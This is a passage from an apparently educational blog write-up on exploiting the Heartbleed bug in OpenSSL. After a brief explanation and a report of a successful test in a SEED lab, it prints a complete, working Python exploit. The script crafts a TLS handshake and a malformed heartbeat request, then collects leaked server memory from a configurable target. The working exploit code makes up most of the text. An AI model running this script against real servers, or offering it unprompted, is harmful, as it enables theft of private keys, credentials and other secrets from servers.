</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> random<span style="color:#f92672">.</span>randbytes(<span style="color:#ae81ff">0x10</span>) <span style="color:#75715e"># For padding </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print_status(<span style="color:#e6db74">&#34;Sending a malicious heartbeat request&#34;</span>)
</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>send(heartbleed)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        rtype, _, leaks <span style="color:#f92672">=</span> tls_record_recv(sock)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> rtype <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> leaks:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> rtype <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x15</span>:
</span></span><span style="display:flex;"><span>            print_error(<span style="color:#e6db74">&#34;Alert record received&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> rtype <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x18</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(leaks) <span style="color:#f92672">&lt;</span> len(heartbleed):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            print_success(Color<span style="color:#f92672">.</span>Bold<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;The target server is vulnerable and we were able to leak </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> bytes&#34;</span> <span style="color:#f92672">%</span> (len(leaks) <span style="color:#f92672">-</span> len(heartbleed)))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> leaks
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print_error(<span style="color:#e6db74">&#34;The target server is not vulnerable&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span></code></pre></div><p>Once the handshake process has been completed successfully, we are ready to send a malicious heartbeat request to the server. This function constructs a heartbeat message based on the description of  <a href="https://datatracker.ietf.org/doc/html/rfc6520#section-4">RFC6520</a>, and it puts crafted malicious input within the message that triggers the bug and forces the server to leak its private memory, as we explained in the analysis and planning phases. If the server is vulnerable to the attack and the exploit is successful, the function will return the leaked data to the caller.</p>
<p>Now the exploit is ready and I&rsquo;m very excited to test it. After searching for a lab set up to test the exploit, luckily I found <a href="https://seedsecuritylabs.org/Labs_16.04/Networking/Heartbleed/">this</a>. Let us test the exploit on it.</p>
<center><img src="/imgs/heartbleed_exploit.png"/></center>
<p>Fantastic, our plan worked. we could force the TLS server to leak its private memory content into our computer. There is a point I want to mention according to RFC, the total length of a heartbeat message should not exceed 2^14, so we leak 0x4000 instead of 0xffff, because if we specify a higher length the response will be fragmented. Moreover, we can freely leak many batches of server memory content.</p>
<p>Here&rsquo;s the full exploit code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Author    =&gt; Abdallah Mohamed ( 0xNinjaCyclone )</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Date      =&gt; 15-03-2024/1:39AM</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span> struct<span style="color:#f92672">,</span> random<span style="color:#f92672">,</span> time<span style="color:#f92672">,</span> datetime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;YOUR_TARGET_HERE&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>LENGTH <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4000</span>
</span></span><span style="display:flex;"><span>TIMEOUT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>BATCHES <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Color</span>:
</span></span><span style="display:flex;"><span>    Red     <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0;31m&#34;</span>
</span></span><span style="display:flex;"><span>    Green   <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0;32m&#34;</span>
</span></span><span style="display:flex;"><span>    Blue    <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0;34m&#34;</span>
</span></span><span style="display:flex;"><span>    Bold    <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[1m&#34;</span>
</span></span><span style="display:flex;"><span>    NC      <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m&#34;</span>   <span style="color:#75715e"># No Color</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">banner</span>():
</span></span><span style="display:flex;"><span>    print(Color<span style="color:#f92672">.</span>Red <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> _     _                         ______  _                  _ 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(_)   (_)                    _  (____  \| |                | |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> _______ _____ _____  ____ _| |_ ____)  ) | _____ _____  __| |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  ___  | ___ (____ |/ ___|_   _)  __  (| || ___ | ___ |/ _  |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| |   | | ____/ ___ | |     | |_| |__)  ) || ____| ____( (_| |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_|   |_|_____)_____|_|      \__)______/ \_)_____)_____)\____|     
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span> <span style="color:#f92672">+</span> Color<span style="color:#f92672">.</span>NC <span style="color:#f92672">+</span> Color<span style="color:#f92672">.</span>Bold <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Author: Abdallah Mohamed (0xNinjaCyclone)&#34;</span> <span style="color:#f92672">+</span> Color<span style="color:#f92672">.</span>NC, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_slowly</span>(msg):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> msg:
</span></span><span style="display:flex;"><span>        print(i, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep( <span style="color:#ae81ff">0.02</span> )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_success</span>(msg):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Color<span style="color:#f92672">.</span>Green<span style="color:#e6db74">}</span><span style="color:#e6db74">[+]</span><span style="color:#e6db74">{</span>Color<span style="color:#f92672">.</span>NC<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>)
</span></span><span style="display:flex;"><span>    print_slowly(msg)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_status</span>(msg):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Color<span style="color:#f92672">.</span>Blue<span style="color:#e6db74">}</span><span style="color:#e6db74">[*]</span><span style="color:#e6db74">{</span>Color<span style="color:#f92672">.</span>NC<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>)
</span></span><span style="display:flex;"><span>    print_slowly(msg)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_error</span>(msg):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Color<span style="color:#f92672">.</span>Red<span style="color:#e6db74">}</span><span style="color:#e6db74">[-]</span><span style="color:#e6db74">{</span>Color<span style="color:#f92672">.</span>NC<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>)
</span></span><span style="display:flex;"><span>    print_slowly(msg)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tls_record_recv</span>(sock):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    received <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        print_status(<span style="color:#e6db74">&#34;Receive a TLS Record headers&#34;</span>)
</span></span><span style="display:flex;"><span>        tls_hdr <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> tls_hdr:
</span></span><span style="display:flex;"><span>            print_error(<span style="color:#e6db74">&#34;The server close the connection while receiving the record headers&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        rtype, tls_version, rlen <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&gt;BHH&#39;</span>, tls_hdr)
</span></span><span style="display:flex;"><span>        print_success(<span style="color:#e6db74">&#34;A TLS Record headers has been received (record type = 0x</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">, record length = </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">)&#34;</span> <span style="color:#f92672">%</span> (rtype, rlen))
</span></span><span style="display:flex;"><span>        print_status(<span style="color:#e6db74">&#34;Receiving the Record payload&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> received <span style="color:#f92672">!=</span> rlen:
</span></span><span style="display:flex;"><span>            pkt <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(rlen <span style="color:#f92672">-</span> received)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> pkt:
</span></span><span style="display:flex;"><span>                print_error(<span style="color:#e6db74">&#34;The server close the connection while receiving the record payload&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> pkt
</span></span><span style="display:flex;"><span>            received <span style="color:#f92672">+=</span> len(pkt)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print_success(<span style="color:#e6db74">&#34;The Record payload has been received successfully&#34;</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> rtype, tls_version, payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tls_handshake</span>(sock):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># https://datatracker.ietf.org/doc/html/rfc5246#section-7.4.1.2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print_status(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Starting negotiation with &#39;</span><span style="color:#e6db74">{</span>TARGET<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># TLS Headers</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x16</span><span style="color:#e6db74">&#34;</span>            <span style="color:#75715e"># Content type (handshake)</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x02</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># TLS version (major, minor)</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xdc</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># TLS message length</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Handshake header</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span>            <span style="color:#75715e"># ClientHello type</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\xd8</span><span style="color:#e6db74">&#34;</span>    <span style="color:#75715e"># Handshake message length</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ClientHello message</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x02</span><span style="color:#e6db74">&#34;</span>        <span style="color:#75715e"># TLS server version</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># The current time and date in standard UNIX 32-bit format</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;I&#34;</span>, int(time<span style="color:#f92672">.</span>mktime(datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>utcnow()<span style="color:#f92672">.</span>timetuple()))) 
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> random<span style="color:#f92672">.</span>randbytes(<span style="color:#ae81ff">28</span>)   <span style="color:#75715e"># 28 random bytes</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>                <span style="color:#75715e"># Session ID</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Cipher suites </span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x66</span><span style="color:#e6db74">&#34;</span>            <span style="color:#75715e"># Length</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\x14\xc0\x0a\xc0\x22\xc0\x21\x00\x39</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x38\x00\x88\x00\x87\xc0\x0f\xc0\x05\x00\x35\x00\x84\xc0\x12</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x0d\xc0\x03\x00\x0a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\x13\xc0\x09\xc0\x1f\xc0\x1e\x00\x33\x00\x32\x00\x9a\x00\x99</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x45\x00\x44\xc0\x0e\xc0\x04\x00\x2f\x00\x96\x00\x41\xc0\x11</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x09</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Compression</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># Length</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># We don&#39;t need any compression</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Extensions</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x49</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># Length</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0b\x00\x04\x03\x00\x01\x02</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0a\x00\x34\x00\x32\x00\x0e</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0d\x00\x19\x00\x0b\x00\x0c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x18\x00\x09\x00\x0a\x00\x16</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x17\x00\x08\x00\x06\x00\x07</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x14\x00\x15\x00\x04\x00\x05</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x12\x00\x13\x00\x01\x00\x02</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x03\x00\x0f\x00\x10\x00\x11</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x23\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    hello <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0f\x00\x01\x01</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print_status(<span style="color:#e6db74">&#34;Sending handshake hello message&#34;</span>)
</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>send(hello)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        rtype, tls_ver, handshake <span style="color:#f92672">=</span> tls_record_recv(sock)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> rtype:
</span></span><span style="display:flex;"><span>            print_error(<span style="color:#e6db74">&#34;Something goes wrong in negotioation!&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> rtype <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x16</span> <span style="color:#f92672">and</span> handshake[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0E</span>:
</span></span><span style="display:flex;"><span>            print_success(<span style="color:#e6db74">&#34;The handshake has been done successfully&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> tls_ver <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0301</span>:
</span></span><span style="display:flex;"><span>                print_status(<span style="color:#e6db74">&#34;TLS server version = v1.0&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> tls_ver <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0302</span>:
</span></span><span style="display:flex;"><span>                print_status(<span style="color:#e6db74">&#34;TLS server version = v1.1&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> tls_ver <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0303</span>:
</span></span><span style="display:flex;"><span>                print_status(<span style="color:#e6db74">&#34;TLS server version = v1.2&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tls_heartbleed</span>(sock):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># https://datatracker.ietf.org/doc/html/rfc6520#section-4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18</span><span style="color:#e6db74">&#34;</span>       <span style="color:#75715e"># Heartbeat type</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x02</span><span style="color:#e6db74">&#34;</span>   <span style="color:#75715e"># TLS version (major, minor)</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x21</span><span style="color:#e6db74">&#34;</span>   <span style="color:#75715e"># Heartbeat length</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span>       <span style="color:#75715e"># HeartbeatRequest (type)</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;H&#34;</span>, LENGTH <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x03</span>) <span style="color:#75715e"># &lt;-- f*cker (badlength - padding - hdrsize)</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x30\x78\x4e\x69\x6e\x6a\x61\x43\x79\x63\x6c\x6f\x6e\x65</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    heartbleed <span style="color:#f92672">+=</span> random<span style="color:#f92672">.</span>randbytes(<span style="color:#ae81ff">0x10</span>) <span style="color:#75715e"># For padding </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print_status(<span style="color:#e6db74">&#34;Sending a malicious heartbeat request&#34;</span>)
</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>send(heartbleed)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        rtype, _, leaks <span style="color:#f92672">=</span> tls_record_recv(sock)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> rtype <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> leaks:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> rtype <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x15</span>:
</span></span><span style="display:flex;"><span>            print_error(<span style="color:#e6db74">&#34;Alert record received&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> rtype <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x18</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(leaks) <span style="color:#f92672">&lt;</span> len(heartbleed):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
